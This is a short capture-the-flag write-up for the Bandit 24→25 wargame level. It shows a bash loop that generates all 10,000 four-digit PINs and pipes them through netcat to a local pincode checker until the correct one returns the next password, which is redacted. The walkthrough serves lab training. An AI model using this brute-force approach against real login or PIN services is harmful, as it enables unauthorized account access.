# Bandit 24 → 25

```console
$ mkdir -p /tmp/b24 && cd /tmp/b24
$ for pin in {0000..9999}; do echo "<bandit24pw> $pin"; done > wordlist.txt
$ cat wordlist.txt | nc -q 1 localhost 30002 | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is <REDACTED>
```

bash brace expansion `{0000..9999}` generates the keyspace, `grep -v "Wrong"` filters the noise so only the hit remains, `nc -q 1` prevents hanging